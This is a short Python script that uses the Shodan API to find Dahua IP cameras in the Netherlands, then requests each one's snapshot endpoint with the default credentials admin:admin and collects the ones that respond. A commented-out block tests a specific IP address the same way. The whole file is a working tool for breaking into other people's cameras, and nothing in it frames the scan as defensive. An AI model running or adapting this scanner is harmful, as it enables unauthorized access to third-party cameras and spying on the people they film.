import requests
import shodan
import eventlet
from requests import Timeout

from secrets import *

api = shodan.Shodan(SHODAN_API_KEY)


# YET TO DECIDE WHICH FUNCTION TO USE
def getaddresses():
    limit = 3
    counter = 0
    iplist = []
    for banner in api.search_cursor('Dahua country:NL'):
        # Perform some custom manipulations or stream the results to a database
        # For this example, I'll just print out the "data" property
        ip = str(banner['ip_str'])
        city = str(banner['location'])
        print(ip)
        print(city)
        iplist.append(ip)
        # Keep track of how many results have been downloaded so we don't use up all our query credits
        counter += 1
        if counter >= limit:
            break
    return iplist


# def getAddresses():
#     try:
#         # Search Shodan
#         results = api.search('Dahua country:NL')
#         # Show the results
#         ipList = []
#         print('Results found: {}'.format(results['total']))
#         for result in results['matches']:
#             ip = str(result['ip_str'])
#             print(ip)
#             ipList.append(ip)
#         return ipList
#     except shodan.APIError as e:
#         print('Error: {}'.format(e))
#     return ipList


def linkbuilder(iplist):
    linklist = []
    for ip in iplist:
        link = 'http://admin:admin@' + ip + '/cgi-bin/snapshot.cgi'
        linklist.append(str(link))
    return linklist


# print(linkbuilder(getaddresses()))


def request(linklist):
    vulnlist = []
    for link in linklist:
        try:
            response = requests.get(link, verify=False, timeout=3)
            if response.status_code == 200:
                vulnlist.append(link)
        except Timeout as ex:
            print("Exception raised:" + ex)
    return vulnlist


print(request(linkbuilder(getaddresses())))


# vulnlist = []
# link = 'http://admin:admin@82.176.209.4/cgi-bin/snapshot.cgi'
# resp = requests.get(link)
# if resp.status_code == 200:
#     vulnlist.append(link)
#     print("succes")
#
# print(vulnlist)
